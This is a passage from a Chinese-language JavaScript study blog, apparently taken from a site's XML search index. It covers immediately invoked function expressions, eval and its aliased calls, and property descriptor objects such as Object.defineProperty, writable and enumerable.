<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语句</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表达式</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>当作表达式时，函数可以定义后直接加圆括号调用，原因就是<code>function</code>作为表达式，引擎就把函数定义当作一个值。这种情况下，就不会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="number">1</span>&#125;();</span><br><span class="line">f <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>为了避免解析的歧义，JavaScript 规定，如果<code>function</code>关键字出现在行首，一律解释成语句。因此，引擎看到行首是<code>function</code>关键字之后，认为这一段都是函数的定义，不应该以圆括号结尾，所以就报错了</p>
<p>函数定义后立即调用的解决方法，就是不要让<code>function</code>出现在行首，让引擎将其理解成一个表达式。最简单的处理，就是将其放在一个圆括号里面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>
<p>注意，上面两种写法最后的分号都是必须的。如果省略分号，遇到连着两个<code>IIFE</code>，可能就会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;())</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;())</span><br></pre></td></tr></table></figure>
<p>上面代码的两行之间没有分号，JavaScript 会将它们连在一起解释，将第二行解释为第一行的参数</p>
<p>推而广之，任何让解释器以表达式来处理函数定义的方法，都能产生同样的效果，比如下面三种写法:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="number">10</span>; &#125;();</span><br><span class="line"><span class="literal">true</span> &amp;&amp; <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;();</span><br><span class="line"><span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;();</span><br></pre></td></tr></table></figure>
<p>甚至像下面这样写，也是可以的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">/* code */</span> &#125;();</span><br><span class="line">~<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">/* code */</span> &#125;();</span><br><span class="line">-<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">/* code */</span> &#125;();</span><br><span class="line">+<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">/* code */</span> &#125;();</span><br></pre></td></tr></table></figure>
<p>通常情况下，只对匿名函数使用这种“立即执行的函数表达式”。它的目的有两个：一是不必为函数命名，避免了污染全局变量；二是 IIFE 内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">var</span> tmp = newData;</span><br><span class="line">processData(tmp);</span><br><span class="line">storeData(tmp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = newData;</span><br><span class="line">  processData(tmp);</span><br><span class="line">  storeData(tmp);</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure>
<p>上面代码中，写法二比写法一更好，因为完全避免了污染全局变量</p>
<h4 id="5-6-eval命令"><a href="#5-6-eval命令" class="headerlink" title="5.6 eval命令"></a>5.6 eval命令</h4><h5 id="5-6-1-基本用法"><a href="#5-6-1-基本用法" class="headerlink" title="5.6.1 基本用法"></a>5.6.1 基本用法</h5><p><code>eval</code>命令接受一个字符串作为参数，并将这个字符串当作语句执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;var a = 1;&#x27;</span>);</span><br><span class="line">a <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>如果参数字符串无法当作语句运行，那么就会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;3x&#x27;</span>) <span class="comment">// Uncaught SyntaxError: Invalid or unexpected token</span></span><br></pre></td></tr></table></figure>

<p>放在<code>eval</code>中的字符串，应该有独自存在的意义，不能用来与<code>eval</code>以外的命令配合使用。举例来说，下面的代码将会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;return;&#x27;</span>); <span class="comment">// Uncaught SyntaxError: Illegal return statement</span></span><br></pre></td></tr></table></figure>
<p>上面代码会报错，因为<code>return</code>不能单独使用，必须在函数中使用</p>
<p>如果<code>eval</code>的参数不是字符串，那么会原样返回</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">123</span>) <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>
<p><code>eval</code>没有自己的作用域，都在当前作用域内执行，因此可能会修改当前作用域的变量的值，造成安全问题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;a = 2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">a <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>为了防止这种风险，JavaScript规定，如果使用严格模式，<code>eval</code>内部声明的变量，不会影响到外部作用域</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="built_in">eval</span>(<span class="string">&#x27;var foo = 123&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(foo);  <span class="comment">// ReferenceError: foo is not defined</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>f</code>内部是严格模式，这时<code>eval</code>内部声明的<code>foo</code>变量，就不会影响到外部</p>
<p>不过，即使在严格模式下，<code>eval</code>依然可以读写当前作用域的变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> foo = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">eval</span>(<span class="string">&#x27;foo = 2&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(foo);  <span class="comment">// 2</span></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>上面代码中，严格模式下，<code>eval</code>内部还是改写了外部变量，可见安全风险依然存在</p>
<p>总之，<code>eval</code>的本质是在当前作用域之中，注入代码。由于安全风险和不利于 JavaScript 引擎优化执行速度，所以一般不推荐使用。通常情况下，<code>eval</code>最常见的场合是解析 <code>JSON</code> 数据的字符串，不过正确的做法应该是使用原生的<code>JSON.parse</code>方法</p>
<h5 id="5-6-2-eval的别名调用"><a href="#5-6-2-eval的别名调用" class="headerlink" title="5.6.2 eval的别名调用"></a>5.6.2 eval的别名调用</h5><p>前面说过<code>eval</code>不利于引擎优化执行速度。更麻烦的是，还有下面这种情况，引擎在静态代码分析的阶段，根本无法分辨执行的是<code>eval</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="built_in">eval</span>;</span><br><span class="line">m(<span class="string">&#x27;var x = 1&#x27;</span>);</span><br><span class="line">x <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>m</code>是<code>eval</code>的别名。静态代码分析阶段，引擎分辨不出<code>m(&#39;var x = 1&#39;)</code>执行的是<code>eval</code>命令</p>
<p>为了保证<code>eval</code>的别名不影响代码优化，JavaScript 的标准规定，凡是使用别名执行<code>eval</code>，<code>eval</code>内部一律是全局作用域</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">var</span> e = <span class="built_in">eval</span>;</span><br><span class="line">  e(<span class="string">&#x27;console.log(a)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>eval</code>是别名调用，所以即使它是在函数中，它的作用域还是全局作用域，因此输出的<code>a</code>为全局变量。这样的话，引擎就能确认<code>e()</code>不会对当前的函数作用域产生影响，优化的时候就可以把这一行排除掉</p>
<p><code>eval</code>的别名调用的形式五花八门，只要不是直接调用，都属于别名调用，因为引擎只能分辨<code>eval()</code>这一种形式是直接调用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>.call(<span class="literal">null</span>, <span class="string">&#x27;...&#x27;</span>)</span><br><span class="line"><span class="built_in">window</span>.eval(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="built_in">eval</span>)(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line">(<span class="built_in">eval</span>, <span class="built_in">eval</span>)(<span class="string">&#x27;...&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面这些形式都是eval的别名调用，作用域都是全局作用域</p>
<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS数据类型-函数</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0016</title>
    <url>/2021/05/13/%E6%89%93%E5%8D%A10016/</url>
    <content><![CDATA[<p><font color=#ac6767>如果你感觉到自己不幸福，是因为你追求的不是幸福，而是比别人幸福。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="2-属性描述对象"><a href="#2-属性描述对象" class="headerlink" title="2. 属性描述对象"></a>2. 属性描述对象</h3><h4 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h4><p>JavaScript 提供了一个内部数据结构，用来描述对象的属性，控制它的行为，比如该属性是否可写、可遍历等等。这个内部数据结构称为“属性描述对象”（attributes object）。每个属性都有自己对应的属性描述对象，保存该属性的一些元信息。</p>
<p>下面是属性描述对象的一个例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  value: <span class="number">123</span>,</span><br><span class="line">  writable: <span class="literal">false</span>,</span><br><span class="line">  enumerable: <span class="literal">true</span>,</span><br><span class="line">  configurable: <span class="literal">false</span>,</span><br><span class="line">  get: <span class="literal">undefined</span>,</span><br><span class="line">  set: <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>属性描述对象提供6个元属性:</p>
<ol>
<li>value<br><code>value</code>是该属性的属性值，默认为<code>undefined</code></li>
<li>writable<br><code>writable</code>是一个布尔值，表示属性值（<code>value</code>）是否可改变（即是否可写），默认为<code>true</code></li>
<li>enumerable<br><code>enumerable</code>是一个布尔值，表示该属性是否可遍历，默认为<code>true</code>。如果设为<code>false</code>，会使得某些操作（比如<code>for...in</code>循环、<code>Object.keys()</code>）跳过该属性</li>
<li>configurable<br><code>configurable</code>是一个布尔值，表示可配置性，默认为<code>true</code>。如果设为<code>false</code>，将阻止某些操作改写该属性，比如无法删除该属性，也不得改变该属性的属性描述对象（<code>value</code>属性除外）。也就是说，<code>configurable</code>属性控制了属性描述对象的可写性</li>
<li>get<br><code>get</code>是一个函数，表示该属性的取值函数（<code>getter</code>），默认为<code>undefined</code></li>
<li>set<br><code>set</code>是一个函数，表示该属性的存值函数（<code>setter</code>），默认为<code>undefined</code></li>
</ol>
<h4 id="2-2-Object-getOwnPropertyDescriptor"><a href="#2-2-Object-getOwnPropertyDescriptor" class="headerlink" title="2.2 Object.getOwnPropertyDescriptor()"></a>2.2 Object.getOwnPropertyDescriptor()</h4><p><code>Object.getOwnPropertyDescriptor()</code>方法可以获取属性描述对象。它的第一个参数是目标对象，第二个参数是一个字符串，对应目标对象的某个属性名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="string">&#x27;a&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="comment">// Object &#123; value: &quot;a&quot;,</span></span><br><span class="line"><span class="comment">//   writable: true,</span></span><br><span class="line"><span class="comment">//   enumerable: true,</span></span><br><span class="line"><span class="comment">//   configurable: true</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.getOwnPropertyDescriptor()</code>方法获取<code>obj.p</code>的属性描述对象<br>注意，<code>Object.getOwnPropertyDescriptor()</code>方法只能用于对象自身的属性，不能用于继承的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="string">&#x27;a&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;toString&#x27;</span>)</span><br><span class="line"><span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>toString</code>是<code>obj</code>对象继承的属性，<code>Object.getOwnPropertyDescriptor()</code>无法获取。</p>
<h4 id="2-3-Object-getOwnPropertyNames"><a href="#2-3-Object-getOwnPropertyNames" class="headerlink" title="2.3 Object.getOwnPropertyNames()"></a>2.3 Object.getOwnPropertyNames()</h4><p><code>Object.getOwnPropertyNames</code>方法返回一个数组，成员是参数对象自身的全部属性的属性名，不管该属性是否可遍历。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperties(&#123;&#125;, &#123;</span><br><span class="line">  p1: &#123; <span class="attr">value</span>: <span class="number">1</span>, <span class="attr">enumerable</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">  p2: &#123; <span class="attr">value</span>: <span class="number">2</span>, <span class="attr">enumerable</span>: <span class="literal">false</span> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(obj)</span><br><span class="line"><span class="comment">// [&quot;p1&quot;, &quot;p2&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.p1</code>是可遍历的，<code>obj.p2</code>是不可遍历的。<code>Object.getOwnPropertyNames</code>会将它们都返回<br>这跟<code>Object.keys</code>的行为不同，<code>Object.keys</code>只返回对象自身的可遍历属性的全部属性名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.keys([]) <span class="comment">// []</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames([]) <span class="comment">// [ &#x27;length&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(<span class="built_in">Object</span>.prototype) <span class="comment">// []</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">Object</span>.prototype)</span><br><span class="line"><span class="comment">// [&#x27;hasOwnProperty&#x27;,</span></span><br><span class="line"><span class="comment">//  &#x27;valueOf&#x27;,</span></span><br><span class="line"><span class="comment">//  &#x27;constructor&#x27;,</span></span><br><span class="line"><span class="comment">//  &#x27;toLocaleString&#x27;,</span></span><br><span class="line"><span class="comment">//  &#x27;isPrototypeOf&#x27;,</span></span><br><span class="line"><span class="comment">//  &#x27;propertyIsEnumerable&#x27;,</span></span><br><span class="line"><span class="comment">//  &#x27;toString&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，数组自身的<code>length</code>属性是不可遍历的，<code>Object.keys</code>不会返回该属性。第二个例子的<code>Object.prototype</code>也是一个对象，所有实例对象都会继承它，它自身的属性都是不可遍历的</p>
<h4 id="2-4-Object-defineProperty-，Object-defineProperties"><a href="#2-4-Object-defineProperty-，Object-defineProperties" class="headerlink" title="2.4 Object.defineProperty()，Object.defineProperties()"></a>2.4 Object.defineProperty()，Object.defineProperties()</h4><p><code>Object.defineProperty()</code>方法允许通过属性描述对象，定义或修改一个属性，然后返回修改后的对象，它的用法如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(object, propertyName, attributesObject)</span><br></pre></td></tr></table></figure>
<p>Object.defineProperty方法接受三个参数，依次如下:</p>
<ul>
<li>object：属性所在的对象</li>
<li>propertyName：字符串，表示属性名</li>
<li>attributesObject：属性描述对象</li>
</ul>
<p>举例来说，定义<code>obj.p</code>可以写成下面这样</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">123</span>,</span><br><span class="line">  writable: <span class="literal">false</span>,</span><br><span class="line">  enumerable: <span class="literal">true</span>,</span><br><span class="line">  configurable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.p <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line">obj.p = <span class="number">246</span>;</span><br><span class="line">obj.p <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.defineProperty()</code>方法定义了<code>obj.p</code>属性。由于属性描述对象的<code>writable</code>属性为<code>false</code>，所以<code>obj.p</code>属性不可写。注意，这里的<code>Object.defineProperty</code>方法的第一个参数是<code>&#123;&#125;</code>（一个新建的空对象），<code>p</code>属性直接定义在这个空对象上面，然后返回这个对象，这是<code>Object.defineProperty()</code>的常见用法。<br>如果属性已经存在，<code>Object.defineProperty()</code>方法相当于更新该属性的属性描述对象。<br>如果一次性定义或修改多个属性，可以使用<code>Object.defineProperties()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperties(&#123;&#125;, &#123;</span><br><span class="line">  p1: &#123; <span class="attr">value</span>: <span class="number">123</span>, <span class="attr">enumerable</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">  p2: &#123; <span class="attr">value</span>: <span class="string">&#x27;abc&#x27;</span>, <span class="attr">enumerable</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">  p3: &#123; <span class="attr">get</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.p1 + <span class="built_in">this</span>.p2 &#125;,</span><br><span class="line">    enumerable:<span class="literal">true</span>,</span><br><span class="line">    configurable:<span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.p1 <span class="comment">// 123</span></span><br><span class="line">obj.p2 <span class="comment">// &quot;abc&quot;</span></span><br><span class="line">obj.p3 <span class="comment">// &quot;123abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.defineProperties()</code>同时定义了<code>obj</code>对象的三个属性。其中，<code>p3</code>属性定义了取值函数<code>get</code>，即每次读取该属性，都会调用这个取值函数<br>注意，一旦定义了取值函数<code>get</code>（或存值函数<code>set</code>），就不能将<code>writable</code>属性设为<code>true</code>，或者同时定义<code>value</code>属性，否则会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">123</span>,</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">456</span>; &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// TypeError: Invalid property.</span></span><br><span class="line"><span class="comment">// A property cannot both have accessors and be writable or have a value</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  writable: <span class="literal">true</span>,</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">456</span>; &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// TypeError: Invalid property descriptor.</span></span><br><span class="line"><span class="comment">// Cannot both specify accessors and a value or writable attribute</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，同时定义了<code>get</code>属性和<code>value</code>属性，以及将<code>writable</code>属性设为<code>true</code>，就会报错<br><code>Object.defineProperty()</code>和<code>Object.defineProperties()</code>参数里面的属性描述对象，<code>writable</code>、<code>configurable</code>、<code>enumerable</code>这三个属性的默认值都为<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;foo&#x27;</span>, &#123;&#125;);</span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   value: undefined,</span></span><br><span class="line"><span class="comment">//   writable: false,</span></span><br><span class="line"><span class="comment">//   enumerable: false,</span></span><br><span class="line"><span class="comment">//   configurable: false</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，定义<code>obj.foo</code>时用了一个空的属性描述对象，就可以看到各个元属性的默认值</p>
<h4 id="2-5-Object-prototype-propertyIsEnumerable"><a href="#2-5-Object-prototype-propertyIsEnumerable" class="headerlink" title="2.5 Object.prototype.propertyIsEnumerable()"></a>2.5 Object.prototype.propertyIsEnumerable()</h4><p>实例对象的<code>propertyIsEnumerable()</code>方法返回一个布尔值，用来判断某个属性是否可遍历。注意，这个方法只能用于判断对象自身的属性，对于继承的属性一律返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.p = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">obj.propertyIsEnumerable(<span class="string">&#x27;p&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">obj.propertyIsEnumerable(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.p</code>是可遍历的，而<code>obj.toString</code>是继承的属性。</p>
<h4 id="2-6-元属性"><a href="#2-6-元属性" class="headerlink" title="2.6 元属性"></a>2.6 元属性</h4><p>属性描述对象的各个属性称为“元属性”，因为它们可以看作是控制属性的属性</p>
<h5 id="2-6-1-value"><a href="#2-6-1-value" class="headerlink" title="2.6.1 value"></a>2.6.1 value</h5><p><code>value</code>属性是目标属性的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.p = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;p&#x27;</span>).value</span><br><span class="line"><span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;p&#x27;</span>, &#123; <span class="attr">value</span>: <span class="number">246</span> &#125;);</span><br><span class="line">obj.p <span class="comment">// 246</span></span><br></pre></td></tr></table></figure>
<p>上面代码是通过<code>value</code>属性，读取或改写<code>obj.p</code>的例子</p>
<h5 id="2-6-2-writable"><a href="#2-6-2-writable" class="headerlink" title="2.6.2 writable"></a>2.6.2 writable</h5><p><code>writable</code>属性是一个布尔值，决定了目标属性的值（value）是否可以被改变</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;a&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">37</span>,</span><br><span class="line">  writable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.a <span class="comment">// 37</span></span><br><span class="line">obj.a = <span class="number">25</span>;</span><br><span class="line">obj.a <span class="comment">// 37</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>obj.a</code>的<code>writable</code>属性是<code>false</code>。然后，改变<code>obj.a</code>的值，不会有任何效果。<br>注意，正常模式下，对<code>writable</code>为<code>false</code>的属性赋值不会报错，只会默默失败。但是，严格模式下会报错，即使对<code>a</code>属性重新赋予一个同样的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;a&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">37</span>,</span><br><span class="line">  writable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.a = <span class="number">37</span>;</span><br><span class="line"><span class="comment">// Uncaught TypeError: Cannot assign to read only property &#x27;a&#x27; of object</span></span><br></pre></td></tr></table></figure>
<p>上面代码是严格模式，对<code>obj.a</code>任何赋值行为都会报错。<br>如果原型对象的某个属性的<code>writable</code>为<code>false</code>，那么子对象将无法自定义这个属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proto = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;foo&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  writable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(proto);</span><br><span class="line"></span><br><span class="line">obj.foo = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">obj.foo <span class="comment">// &#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>proto</code>是原型对象，它的<code>foo</code>属性不可写。<code>obj</code>对象继承<code>proto</code>，也不可以再自定义这个属性了。如果是严格模式，这样做还会抛出一个错误。<br>但是，有一个规避方法，就是通过覆盖属性描述对象，绕过这个限制。原因是这种情况下，原型链会被完全忽视。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proto = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;foo&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  writable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(proto);</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">&#x27;foo&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="string">&#x27;b&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.foo <span class="comment">// &quot;b&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-6-3-enumerable"><a href="#2-6-3-enumerable" class="headerlink" title="2.6.3 enumerable"></a>2.6.3 enumerable</h5><p><code>enumerable</code>（可遍历性）返回一个布尔值，表示目标属性是否可遍历。<br>JavaScript 的早期版本，<code>for...in</code>循环是基于<code>in</code>运算符的。我们知道，<code>in</code>运算符不管某个属性是对象自身的还是继承的，都会返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="string">&#x27;toString&#x27;</span> <span class="keyword">in</span> obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
